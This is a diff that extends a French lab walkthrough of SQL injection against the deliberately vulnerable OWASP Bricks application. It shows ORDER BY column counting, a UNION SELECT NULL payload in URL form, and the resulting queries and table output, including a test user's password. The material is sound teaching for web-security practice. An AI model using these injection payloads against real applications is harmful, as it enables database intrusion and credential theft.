@@ -252,11 +252,46 @@ On utilise l'opérateur `ORDER BY` pour déterminer le nombre de colonnes.
 `http://192.168.56.101/owaspbricks/content-1/index.php?id=1+ORDER+BY+8` est valide, et correpond à la requête SQL
 
 ```
-SELECT * FROM users WHERE idusers=1 ORDER BY 8 LIMIT 1
+SELECT * FROM users WHERE idusers=1 ORDER BY 8 LIMIT 1;
+```
+
+```
++---------+------+-------------------+----------+---
+| idusers | name | email             | password |
++---------+------+-------------------+----------+--- ...
+|       1 | tom  | tom@getmantra.com | tom      |
++---------+------+-------------------+----------+---
 ```
 
 Néanmoins, dès que l'on dépasse le nombre de colonnes avec `ORDER BY 9`, l'application renvoie une erreur.
 
 ![Injection avec un ORDER BY supérieur au nombre de colonnes de la requête](./images/order_by_9.png)
 
-On en déduit donc que la réponse à la requête SQL effectué par l'application ne contient que 8 colonnes.
+On en déduit donc que la __réponse à la requête SQL__ effectué par l'application ne contient que __8 colonnes__.
+
+## Création d'une requête avec UNION
+
+Maintenant que l'on connait le nombre de colonnes de la requête SQL, on peut insérer une requête avec `UNION` pour extraire des données de la base.
+
+Comme la réponse contient 8 colonnes, on insère un union avec 8 `NULL`. On ajoute également le fameux __`;-- `__ pour commenter la fin de la requête.
+
+L'URL : `http://192.168.56.101/owaspbricks/content-1/index.php?id=1+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- `.
+
+Ce qui donne la requête :
+```
+SELECT * FROM users WHERE idusers=1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;--  LIMIT 1;
+```
+
+```
++---------+------+-------------------+----------+---------------+--
+| idusers | name | email             | password | ua            | r
++---------+------+-------------------+----------+---------------+--
+|       1 | tom  | tom@getmantra.com | tom      | Block_Browser |  
+|    NULL | NULL | NULL              | NULL     | NULL          | N
++---------+------+-------------------+----------+---------------+--
+```
+
+L'application n'affiche malgré tout que la première ligne. Nos `NULL` ne sont donc pas affichés.\
+ Néanmoins, l'absence de message d'erreur nous permet de déduire que nous avons bien le bon nombre de colonnes.
+
+![La réponse ne change pas avec une simple injection UNION SELECT NULL,...](images/select_union.png)
